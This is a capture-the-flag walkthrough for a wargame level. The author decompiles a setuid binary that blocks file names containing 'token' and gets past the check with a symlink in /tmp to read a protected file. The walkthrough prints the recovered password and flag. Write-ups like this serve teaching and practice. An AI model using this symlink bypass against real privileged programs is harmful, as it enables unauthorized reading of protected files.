What do we have?

	$ ll
	total 28
	dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 ./
	d--x--x--x  1 root    users    340 Aug 30  2015 ../
	-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout*
	-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc*
	-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08*
	-r-x------  1 level08 level08  675 Apr  3  2012 .profile*
	-rw-------  1 flag08  flag08    26 Mar  5  2016 token

A binary `level08`, with the rights to launch as owner, and a `token` file. Again, let's take a look through `Ghidra`:

	/* WARNING: Unknown calling convention */

	int main(int argc,char **argv,char **envp)

	{
	char *pcVar1;
	int __fd;
	size_t __n;
	ssize_t sVar2;
	int in_GS_OFFSET;
	undefined4 *in_stack_00000008;
	int fd;
	int rc;
	char buf [1024];
	undefined1 local_414 [1024];
	int local_14;
	
	local_14 = *(int *)(in_GS_OFFSET + 0x14);
	if (argc == 1) {
		printf("%s [file to read]\n",*in_stack_00000008);
						/* WARNING: Subroutine does not return */
		exit(1);
	}
	pcVar1 = strstr((char *)in_stack_00000008[1],"token");
	if (pcVar1 != (char *)0x0) {
		printf("You may not access \'%s\'\n",in_stack_00000008[1]);
						/* WARNING: Subroutine does not return */
		exit(1);
	}
	__fd = open((char *)in_stack_00000008[1],0);
	if (__fd == -1) {
		err(1,"Unable to open %s",in_stack_00000008[1]);
	}
	__n = read(__fd,local_414,0x400);
	if (__n == 0xffffffff) {
		err(1,"Unable to read fd %d",__fd);
	}
	sVar2 = write(1,local_414,__n);
	if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
						/* WARNING: Subroutine does not return */
		__stack_chk_fail();
	}
	return sVar2;
	}

So, it's a binary that open the file given as argument, and read it, but only after checking that it is not named `token`...

	$ ./level08 token
	You may not access 'token'

We do not have the rights to copy the file.

	$ cp -R token /tmp/e
	cp: cannot open `token' for reading: Permission denied

So we can try a symlink.

	$ ln -s /home/user/level08/token /tmp/e
	$ ./level08 /tmp/e
	quif5eloekouj29ke0vouxean

But then, the flag is not the password to `level09`...

	$ su level09
	Password:
	su: Authentication failure

We remembered that there was the flags users, so we tried to log into `flag08` with it:

	$ su flag08
	Password:
	Don't forget to launch getflag !
	$ getflag
	Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f 
